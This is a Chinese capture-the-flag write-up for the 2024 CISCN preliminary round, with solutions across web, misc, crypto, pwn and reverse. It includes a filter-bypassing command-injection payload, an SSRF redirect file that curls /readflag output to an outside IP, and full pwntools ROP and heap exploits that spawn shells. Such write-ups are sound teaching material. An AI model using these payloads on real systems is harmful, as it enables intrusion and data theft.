---
title: 2024ciscn初赛wp
tags:
  - CTF
categories:
  - CTF
cover: https://www.loliapi.com/bg/
coverWidth: 1000
coverHeight: 400
---

## 解题过程

### Web

#### Simple_php

进去就给了源码

```php
<?php
ini_set('open_basedir', '/var/www/html/');
error_reporting(0);

if(isset($_POST['cmd'])){
    $cmd = escapeshellcmd($_POST['cmd']); 
     if (!preg_match('/ls|dir|nl|nc|cat|tail|more|flag|sh|cut|awk|strings|od|curl|ping|\*|sort|ch|zip|mod|sl|find|sed|cp|mv|ty|grep|fd|df|sudo|more|cc|tac|less|head|\.|{|}|tar|zip|gcc|uniq|vi|vim|file|xxd|base64|date|bash|env|\?|wget|\'|\"|id|whoami/i', $cmd)) {
         system($cmd);
}
}


show_source(__FILE__);
?>
```

一看这逆天正则,几乎把所有的命令都禁了,真nb啊,不过看了半天发现他的php的命令没过,并且-也没被过滤,所以就有可乘之机辣!!!

可以利用php -e命令来执行php代码

![img](../../../../图片/本地图床/1716110470999-927dd8da-6131-4a24-b9a6-2438a63395b2.png)

不过这个逆天正则把'和"都过滤了,以及一堆特殊符号

真别说,搜搜咋执行的时候找到了第12届国赛的题,有了思路

![img](../../../../图片/本地图床/1716110627351-61becbb0-924a-4471-b0b3-b909c957ff3c.png)

真帅吧,这操作,字符串转16进制的话会有字母,也就是这是一个字符串,需要单双引号,但是被禁用了,不过可以把他转成36进制,这样就不含字母了,这思路真nb

```c
echo base_convert('ls', 36, 10);
```

可以用这个函数来转换字符串,

base_convert(1751504350,10,36)(base_convert(17523,10,36));这样的话就构造成了system(dir)

![img](../../../../图片/本地图床/1716111041058-d57ae86e-a5d5-4a09-a205-200d592f3009.png)

可以发现报错的最前面有个index.php,说明执行成功,完美~

不过base_convert这个函数有个缺陷只能构造出0-9,a-z,其他整不出来,有些可惜,不过思路打开了

其实如果想继续用这个构造的话可以搭配其他进制转换函数,不过构造会有点恶心.所以搜搜其他解法,

发现php有个特性,想要不带单双引号的整字符串的话,可以在它的前面加上下划线,这样就会被识别成字符串,所以就可以利用另一个进制转换函数hex2bin来构造执行命令了

直接利用php的bin2hex来字符串转成16进制即可

```php
echo(bin2hex("system('cat /etc/passwd');"));
```

![img](../../../../图片/本地图床/1716111858477-ac8dac91-93ba-4d5a-bbd4-f35ed7da19e1.png)

看根目录没flag,猜测可能在数据库里

![img](../../../../图片/本地图床/1716111911072-b9ba7f61-80ac-4fe6-9848-d32121d077b5.png)

/etc/passwd里面有mysql数据库,爆出root/root用户名密码

```php
echo(bin2hex("echo `mysql -u root -p'root' -e 'show databases'`"));
echo(bin2hex("echo `mysql -u root -p'root' -e 'use PHP_CMS;show tables;'`"));
echo(bin2hex("echo `mysql -u root -p'root' -e 'use PHP_CMS;select* from F1ag_Se3Re7'`"));
```

![img](../../../../图片/本地图床/1716112169684-76c4be65-7714-416b-9667-ffa3811c664a.png)

#### easycms_revenge

看题目描述是昨天的easycms升级版，但最后好像也没升级啥。日，昨天找到了ssrf点，但没打通，可惜了

首先他是一个xunrui的cms，github上有他源码https://github.com/dayrui/xunruicms?tab=readme-ov-file

然后在第一天的cms里给了flag.php的源码

```php
if($_SERVER["REMOTE_ADDR"] != "127.0.0.1"){

  echo "Just input 'cmd' From 127.0.0.1";

  return;

}else{

  system($_GET['cmd']);

}
```

由于这个REMOTE_ADDR伪造不了,只能通过ssrf来打,之前vecctf有个类似的题,所以搜搜xunruicms的漏洞,看看有没有关于ssrf的.

![img](../../../../图片/本地图床/1716107893058-795ca8a5-f85d-40fd-a14d-3fae6c5c99ec.png)

还可以发现有个贵州cms和他洞差不多

![img](../../../../图片/本地图床/1716109080295-9348f954-4226-4532-8bef-281a8edee8fb.png)

可以看到他有个qrcode的ssrf,不过这个cnvd不公开,得自己审下源码

所以需要咱们down下来自己分析

![img](../../../../图片/本地图床/1716107953988-e87a1ea0-4bf5-42a3-8997-6b494324b226.png)

,直接先搜搜qrcode,在这几个文件里来回审审

![img](../../../../图片/本地图床/1716108012698-56f89173-a66a-43ab-b77f-bbdca6242c03.png)

可以看到,在Helper这个文件里面存在着这个

```php
index.php?s=api&c=api&m=qrcode&thumb='.urlencode($thumb).'&text='.urlencode($text).'&size='.$size.'&level='.$level;
```

看他上面注释也能知道这是个二维码调用的函数,然后再看他参数,基本都能被咱们控制,而且这个thumb参数是可以输入url远程调用二维码的,因此就给了咱们机会.可以实现SSRF!!!!

这样思路就清晰了,直接在自己vps上整个恶意文件,伪装成二维码,然后重定向到flag.php,再用cmd来执行命令,完美~~~~

构造恶意文件:

```php
#define width 1000
#define height 1000
<?php
header("location:http://127.0.0.1/flag.php?cmd=curl http://59.110.28.63:6666/?id=`/readflag`");
?>
```

利用header来重定向到flag.php,接着通过curl来外带命令执行结果,再开个python http服务来接收即可.

http://eci-2ze4u7rbddg2d2cl58s7.cloudeci1.ichunqiu.com/index.php?s=api&c=api&m=qrcode&thumb=http://59.110.28.63/1.php&text=1&size=10&level=10

日,之前一直读的/flag,没有tmd

之后再好好看根目录才发现有个readflag,眼瞎了

![img](../../../../图片/本地图床/1716108822678-6d56f64d-0f78-471f-b4c3-3d163f5fcd9e.png)

flag{5fb5c22e-5667-47c3-9959-0fc6e43f483e}

### Misc

#### 大学生安全测试能力调研问卷

填就完事了

#### 火锅链观光打卡

![img](../../../../图片/本地图床/1716108839871-a8ebd7c7-26d4-4a82-a738-feba086d9ab3.png)

![img](../../../../图片/本地图床/1716108858287-5cf9345a-2701-4b6e-82d2-e7e2d7c5c37a.png)

安装MetaMask，然后连接钱包，然后答题

![img](../../../../图片/本地图床/1716109042231-00454086-fd1f-41ac-8f9c-2db3a0d06699.png)

然后搞7个以上，兑换flag

![img](../../../../图片/本地图床/1716109087152-ac6c9339-7e76-41c6-9e3b-5b023ce5b76c.png)

#### 通风机

下载下来的文件是mwp文件

![img](../../../../图片/本地图床/1716110746420-df146dee-4c83-4ab1-ae06-d347920ff362.png)

搜索发现是西门子的啥玩意，去官网下软件

然后就是西门子的，用STEP 7 MicroWIN SMART打开

但是没能成功打开，用010查看，发现文件头有误

补全文件头，然后就正常打开了

![img](../../../../图片/本地图床/1716111609926-03e0e9df-e80d-4a19-83a3-ba4e51bad7bc.png)

发现有备注信息，里面的内容是base64，解码得到flag

![img](../../../../图片/本地图床/1716111652950-c343011b-6f6e-46e3-adbf-80080f1e5e4e.png)

base64（没记错的话，大概率没记错）

#### Power Trajectory Diagram

让gpt写个读npz文件的东西

```python
import numpy as np

# 假设你的 .npz 文件名是 'data.npz'
filename = 'attachment.npz'

# 读取 .npz 文件
data = np.load(filename)

# 打印文件中包含的数组名称
print(data.files)

# 访问每个数组
for array_name in data.files:
    print(f"{array_name}: {data[array_name]}")
```

通过input、index、trace的内容可以分析出，它大概有13组数据每组数据对应一幅图，有点类似键盘敲击的

```python
import numpy as np

f = np.load('attachment.npz')
ip = f['input']
tr = f['trace']

result_indices = []

for i in range(13):
    trace_slice = tr[i * 40:(i + 1) * 40]
    input_slice = ip[i * 40:(i + 1) * 40]

    min_indices = [np.argmin(trace) for trace in trace_slice]
    max_variation_index = np.argmax(min_indices)
    result_indices.append(input_slice[max_variation_index])

print(''.join(map(str, result_indices)))
```

#### 神秘文件

将ppt文件转换为zip，文档打开找到，ppt信息里面也可以找到，懒得截图了

Part1:flag{e

![img](../../../../图片/本地图床/1716106492580-26b1e005-7512-42d9-a272-151cd3f43b17.png)

![img](../../../../图片/本地图床/1716107572564-18f01d74-a502-40d8-af18-9f2c23c4d3a4.png)

（算了还是截了）

![img](../../../../图片/本地图床/1716107764486-62638e04-f9c4-4218-9de0-f56184826389.png)

解密

part2:675efb

里面有个word，搞成zip解压

![img](../../../../图片/本地图床/1716107925246-fe0a3e99-3fbd-4c65-9069-b3e0db9b6c6d.png)

接着凯撒爆破base64

![img](../../../../图片/本地图床/1716108031213-a6565110-6e74-4b6b-870b-4b311fdba2f9.png)

PArt3:3-34

alt+F11打开vba代码

![img](../../../../图片/本地图床/1716108094760-e1590f14-1867-4228-8b08-26a43e592d5e.png)

问gpt是RC4（一直以为要写解密脚本！！！）

![img](../../../../图片/本地图床/1716108192751-d5e40af9-9475-41b2-9ddc-31427c36089b.png)

Payt4:6f-40

PPT给图片掀开

![img](../../../../图片/本地图床/1716108300557-25e6cd01-2729-47c5-9490-c04ef5a82deb.png)

base64解密

![img](../../../../图片/本地图床/1716108384838-aa51d603-310f-4674-8b7f-5c29dec629ac.png)

pArt5:5f-90d

第五页ppt

![img](../../../../图片/本地图床/1716108414303-ed12dfe7-8dfb-43f3-a604-53a7faa1c689.png)

多轮base64解密

![img](../../../../图片/本地图床/1716108449233-8834d997-0c5b-4849-a675-1bb86e310e60.png)

ParT6:d-2

还是改为zip解压出来的题目里找到的

![img](../../../../图片/本地图床/1716108629143-0d7aab51-366f-40f3-9ac2-efc31576b3bc.png)

base64

![img](../../../../图片/本地图床/1716108642560-2fe27b40-d301-4b10-ac41-6d019d8c9fc8.png)

PART7=22b3

对

![img](../../../../图片/本地图床/1716108872948-8899a2b1-85d3-44ae-b15a-f932c3e3b90f.png)

对

![img](../../../../图片/本地图床/1716109032598-2b029db2-3a2b-4d7b-9616-1b58cd646e07.png)

对

![img](../../../../图片/本地图床/1716108989806-a7901a7e-b2f9-4b98-8e07-1f3dc64b0933.png)

paRt8:87e

密文在前面，这回真不截了

![img](../../../../图片/本地图床/1716106998432-8d9281e6-78d5-4767-9d57-2748fde14a80.png)

替换也有提示懒得截了

![img](../../../../图片/本地图床/1716106978866-2cbc8c98-b5a2-407f-8d7e-e5dc912f3eb9.png)

parT9:dee

还是那个文件夹里

![img](../../../../图片/本地图床/1716109359865-6a66e95f-4841-419d-834f-82d27db8a1b6.png)

解密

![img](../../../../图片/本地图床/1716109410500-69b85e2a-6fb6-4bbd-8f99-57042d6cb5bb.png)

PARt10:9}

维吉尼亚 key也有懒得解了

![img](../../../../图片/本地图床/1716109807249-dfa68f6f-b9b1-428a-987a-d0dcfc97440b.png) 

### Crypto

#### OvO

sage原文

```python
from Crypto.Util.number import *
from secret import flag

nbits = 512
p = getPrime(nbits)
q = getPrime(nbits)
n = p * q
phi = (p-1) * (q-1)
while True:
    kk = getPrime(128)//128
    rr = kk + 2
    e = 65537 + kk * p + rr * ((p+1) * (q+1)) + 1
    if gcd(e, phi) == 1:
        break
m = bytes_to_long(flag)
c = pow(m, e, n)

e = e >> 200 << 200	#高位攻击
print(f'n = {n}')
print(f'e = {e}')
print(f'c = {c}')

"""
n = 111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967
e = 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104
c = 14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823
"""
```

发现是e的高位攻击，然后搞出e与p的关系

```python
from tqdm import tqdm
from Crypto.Util.number import long_to_bytes, inverse, GCD
from sage.all import PolynomialRing, Zmod, RealField, ZZ


def get_full_p(p_high, n, d_high, bits):
    PR = PolynomialRing(Zmod(n), 'x')
    x = PR.gen()
    f = x + p_high
    roots = f.small_roots(X=2 ** (bits + 4), beta=0.4)

    if roots:
        x0 = roots[0]
        p = GCD(x0 + p_high, n)
        return ZZ(p)
    return None


def find_p_high(e, n, bits):
    PR = PolynomialRing(RealField(1000), 'X')
    X = PR.gen()
    rr = e // n
    kk = rr - 2
    f = (kk + rr) * X ** 2 + (rr * (n + 1) + 65538) * X + rr * n - e * X
    results = f.roots()

    if results:
        for root in results:
            p_high = int(root[0]) >> 4 << 4
            p = get_full_p(p_high, n, e, bits)
            if p and str(p)[0] == '9':
                return p
    return None


def main():
    n = 111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967
    e = 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104
    c = 14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823
    p = find_p_high(e, n, 200)

    if p:
        q = n // p
        print(f"p: {p}")
        print(f"q: {q}")

        rr = e // n
        kk = rr - 2
        new_e = 65537 + kk * p + rr * ((p + 1) * (q + 1)) + 1
        print(f"e: {new_e}")

        phi_n = (p - 1) * (q - 1)
        d = inverse(new_e, phi_n)
        print(f"d: {d}")

        m = pow(c, d, n)
        decrypted_message = long_to_bytes(m)
        print(f"flag: {decrypted_message}")
    else:
        pass


if __name__ == "__main__":
    main()

# p: 9915449532466780441980882114644132757469503045317741049786571327753160105973102603393585703801838713884852201325856459312958617061522496169870935934745091
# q: 11287710353955888973017088237331029225772085726230749705174733853385754367993775916873684714795084329569719147149432367637098107466393989095020167706071637
# e: 37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226053225696381145049303216018329937626866082580192534109310743249
# d: 40562370691549621318549577950032175038658590691131469091909407935553676331176752570788349128822472320141028057032815128710763002566130430070603179406801031103153868717775020292889882861093052194287247276202665973400686789725153480640714911756153417332445558986048503928766869105149777013026905407852425839049
# flag: b'flag{b5f771c6-18df-49a9-9d6d-ee7804f5416c}'
```

#### 古典密码

Atbash Cipher

![img](../../../../图片/本地图床/1716110896418-ec5dd2d6-4731-47e9-ac78-acb22a0b554c.png)

加上lg傻傻的交了一遍，发现不对，看到了lg再去栅栏解密一下

![img](../../../../图片/本地图床/1716111008510-fded6daa-2ee9-45c9-987c-09eaecab185c.png)

### Pwn

#### gostack

首先通过自动补全符号表来理解程序的结构和功能。接着，使用checksec工具检查可执行文件的安全特性，发现只开了NX，分析之后锁定溢出点

exp:

```python
# -*- coding=utf-8 -*-
from pwn import *
from LibcSearcher import *
from struct import pack
import time
import random
from ctypes import *
fname = 'F:/betwen/题库/24国赛/gostack'
context(arch='amd64',os='linux')
elf = ELF(fname)
libc = elf.libc

rc=lambda *args:p.recv(*args)
ru=lambda x:p.recvuntil(x)
sl=lambda x:p.sendline(x)
sd=lambda x:p.send(x)
sa=lambda a,b:p.sendafter(a,b)
sla=lambda a,b:p.sendlineafter(a,b)
ls=lambda *args:log.success(*args)
ia=lambda *args:p.interactive()
pl=lambda *args:print(*args)
ts=lambda *args:time.sleep(*args)
l8 = lambda x:x.ljust(8,b'\x00')

p = remote("8.147.128.251","44715")

def pwn():
        syscall = 0x0000000000404043
        rax_ret = 0x000000000040f984
        rdi_6_ret = 0x00000000004a18a5
        rsi_ret = 0x000000000042138a
        rdx_ret = 0x00000000004944ec
        ru('message :')
        payload = b'a'*0x100+p64(elf.bss())+p64(0x10)+p64(0)*0x18
        payload += p64(rdi_6_ret)+p64(0)*6+p64(rsi_ret)+p64(elf.bss()+0x200)+p64(rdx_ret)+p64(0x100)+p64(rax_ret)+p64(0)+p64(syscall)
        payload += p64(rdi_6_ret)+p64(elf.bss()+0x200)+p64(0)*5
        payload += p64(rdi_6_ret)+p64(elf.bss()+0x200)+p64(0)*5
        payload += p64(rdi_6_ret)+p64(elf.bss()+0x200)+p64(0)*5+p64(rsi_ret)+p64(0)+p64(rdx_ret)+p64(0)+p64(rax_ret)+p64(59)+p64(syscall)
        sl(payload)
        input()
        sd('/bin/sh\x00')
        ia()

pwn()
```

#### orange_cat_diary

house of orange free出一个unsorted chunk，然后泄露libc地址，用use after free劫持malloc hook即可

exp：

```python
from pwn import *
context.log_level='debug'
p=remote("8.147.133.230","33569")
libc=ELF('F:\pwn\libc-2.23.so')

def choice(i):
    p.sendlineafter('choice:',str(i))

def add(size,content):
    choice(1)
    p.sendlineafter('content:',str(size))
    p.sendafter('content:',content)
def edit(size,content):
    choice(4)
    p.sendlineafter('content:',str(size))
    p.sendafter('content:',content)

p.sendafter('name.','adadawdawdawfwewfwe')

add(0x68,b'a')
edit(0x70,b'a'*0x68+p64(0x0f91))
add(0x1000,b'a')
add(0x18,b'a'*8)
choice(2)
libc_addr=u64(p.recvuntil(b'\x7f')[-6:]+b'\0\0')-1640-0x10-libc.sym['__malloc_hook']
success('libc_addr: '+hex(libc_addr))
one=[0x45226,0x4527a,0xf03a4,0xf1247]
add(0x68,b'a')
choice(3)
edit(0x10,p64(libc_addr+libc.sym['__malloc_hook']-0x23))
add(0x68,b'a')
add(0x68,b'a'*(0x13)+p64(libc_addr+one[2]))


choice(1)
p.sendlineafter('content:',str(0x20))
p.interactive()
```

### Reverse

#### asm_re

一开始还想还原这个ida工程文件hhh，发现根本做不到，后面纯看arm汇编代码，直接手撕就好，加密逻辑在这儿，密文一开始还找半天，后面发现应该是存在变量unk_100003F10里面

![img](../../../../图片/本地图床/1716107133474-6dd6bd70-f747-4e79-82d0-bd71353915ef.png)



搓出脚本之后也还是卡了一小会儿，最后反应过来大小端的问题，改一下小端就好了，爆破一下直接出

exp:

```python
k = [
    0x1fd7, 0x21b7, 0x1e47, 0x2027, 0x26e7, 0x10d7, 0x1127, 0x2007,
    0x11c7, 0x1e47, 0x1017, 0x1017, 0x11f7, 0x2007, 0x1037, 0x1107,
    0x1f17, 0x10d7, 0x1017, 0x1017, 0x1f67, 0x1017, 0x11c7, 0x11c7,
    0x1017, 0x1fd7, 0x1f17, 0x1107, 0x0f47, 0x1127, 0x1037, 0x1e47,
    0x1037, 0x1fd7, 0x1107, 0x1fd7, 0x1107, 0x2787
]

for i in range(len(k)):
    for j in range(128): 
        if (((j * ord('P') + 0x14) ^ ord('M')) + 0x1e) == k[i]:
            print(chr(j), end="") 
#flag{67e9a228e45b622c2992fb5174a4f5f5}
```

#### whereThel1b

还真是第一次遇见这种，给了个so和一个py文件，一开始的想法是能不能给so解包之类的，因为py文件里面密文给了，就差一个加密逻辑，找了一大圈还是没找到，最后还是想到了调一下so文件，像调安卓那样

动调起来锁定出了两个函数，得知输入的数据先经过base64编码之后再进行的异或![img](../../../../图片/本地图床/1716109884779-17e06c83-6fc5-4814-bd3c-48dc2b4e2d3b.png)

![img](../../../../图片/本地图床/1716109932327-1f17bb8d-f10b-4e67-b587-873ccedb086b.png)

加密逻辑知道了，但是不知道异或的值是什么，一开始以为是存在r18里面的，最后调了一下找不到规律，最后想到重新写一份密文输入，然后把加密之后的数据输出一下，前后异或得到所需异或的值，想办法输入一个输构造出经过base64编码之后长度为56的数

![img](../../../../图片/本地图床/1716110117071-af6369b0-a2ff-4e9b-a55e-3bb343104144.png)

exp:

其中aa是上图构造的“55555555555555555555555555555555555555555555”的base64之后的值，然后bb是运行上图之后得到的异或之后的值，最后运行出来的结果解一下base64就行

```python
encry = [108, 117, 72, 80, 64, 49, 99, 19, 69, 115, 94, 93, 94, 115, 71, 95, 84, 89, 56, 101, 70, 2, 84, 75, 127, 68, 103, 85, 105, 113, 80, 103, 95, 67, 81, 7, 113, 70, 47, 73, 92, 124, 93, 120, 104, 108, 106, 17, 80, 102, 101, 75, 93, 68, 121, 26]

aa = [78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49,78,84,85,49]
bb = [120, 76, 101, 9, 84, 86, 69, 17, 81, 77, 103, 4, 93, 74, 67, 20, 67, 116, 93, 35, 70, 100, 83, 22, 125, 68, 119, 28, 125, 114, 92, 34, 72, 122, 81, 7, 101, 65, 75, 18, 72, 66, 78, 37, 105, 124, 88, 18, 80, 72, 98, 16, 94, 87, 102, 18]

for i in range(len(aa)):
    print(chr(((aa[i]^bb[i]))^encry[i]),end='')
#ZmxhZ3s3ZjlhMmQzYy0wN2RlLTExZWYtYmU1ZS1jZjFlODg2NzRjMGJ9
```

![img](../../../../图片/本地图床/1716110388906-19b8d9e8-944d-4754-abc1-bb32539cf928.png)

#### gdb_debug

进入主函数之后逻辑还是相当清楚的，锁定了一下伪随机数

![img](../../../../图片/本地图床/1716108171134-d0c78cae-29d9-40d8-98cb-2cc66768bf09.png)

动调跑起来取出随机数

```php
0xd9, 0x0f, 0x18, 0xBD, 0xC7, 0x16, 0x81, 0xbe, 0xf8, 0x4A, 0x65, 0xf2, 0x5D, 0xab, 0x74, 0x33, 0xd4, 0xa5, 0x67, 0x98, 0x9f, 0x7E, 0x2B, 0x5D, 0xc2, 0xaf, 0x8e, 0x3A, 0x4C, 0xa5, 0X75, 0X25, 0xb4, 0x8d, 0xe3, 0X7B, 0xa3, 0x64
```

然后直接从后往前逆就好

exp:

```c
#include <stdio.h>

int main() {
    int indexArray[38];
    int buffer[38];
    int outputBuffer[38];
    int originalNumbers[] = {
        94, 30, 2, 68, 157, 32, 134, 99, 227, 214,
        182, 105, 24, 193, 153, 168, 188, 5, 121, 159,
        25, 110, 218, 76, 117, 174, 192, 185, 247, 122,
        149, 77, 23, 135, 148, 84, 191, 185
    };
    unsigned char byteSequence[] = {
        128, 180, 64, 184, 148, 200, 52, 101, 238, 69,
        215, 157, 60, 136, 140, 169, 107, 174, 125, 135,
        214, 135, 15, 218, 70, 100, 57, 147, 169, 144,
        184, 113, 131, 232, 172, 201, 231, 83
    };
    unsigned int shuffledIndices[38];
    for (int i = 0; i < 38; i++) {
        shuffledIndices[i] = originalNumbers[i] ^ byteSequence[i];
    }
    int encryptionKeys[] = {0xd9, 0x0f, 0x18, 0xBD, 0xC7, 0x16, 0x81, 0xbe, 0xf8, 0x4A, 0x65, 0xf2, 0x5D, 0xab, 0x74, 0x33, 0xd4, 0xa5, 0x67, 0x98, 0x9f, 0x7E, 0x2B, 0x5D, 0xc2, 0xaf, 0x8e, 0x3A, 0x4C, 0xa5, 0x75, 0x25, 0xb4, 0x8d, 0xe3, 0x7B, 0xa3, 0x64};
    int permutationOrder[] = {33, 0, 10, 0, 32, 31, 10, 29, 9, 24, 26, 11, 20, 24, 21, 3, 12, 10, 13, 2, 15, 4, 13, 10, 8, 3, 3, 6, 0, 4, 1, 1, 5, 4, 0, 0, 1};
    unsigned char dataXor[] = {0xBF, 0xD7, 0x2E, 0xDA, 0xEE, 0xA8, 0x1A, 0x10, 0x83, 0x73, 0xAC, 0xF1, 0x06, 0xBE, 0xAD, 0x88, 0x04, 0xD7, 0x12, 0xFE, 0xB5, 0xE2, 0x61, 0xB7, 0x3D, 0x07, 0x4A, 0xE8, 0x96, 0xA2, 0x9D, 0x4D, 0xBC, 0x81, 0x8C, 0xE9, 0x88, 0x78};
    char inputData[] = "congratulationstoyoucongratulationstoy";

    for (int i = 0; i < 38; i++) {
        indexArray[i] = i;
    }
    for (int k = 37; k > 0; --k) {
        int swapIndex = permutationOrder[37 - k] % (k + 1);
        int tempIndex = indexArray[k];
        indexArray[k] = indexArray[swapIndex];
        indexArray[swapIndex] = tempIndex;
    }
    for (int i = 0; i < 38; i++) {
        buffer[i] = shuffledIndices[i] ^ inputData[i] ^ dataXor[i];
        outputBuffer[indexArray[i]] = encryptionKeys[indexArray[i]] ^ buffer[i];
    }
    for (int i = 0; i < 38; i++) {
        printf("%c", outputBuffer[i]);
    }
    return 0;
}
```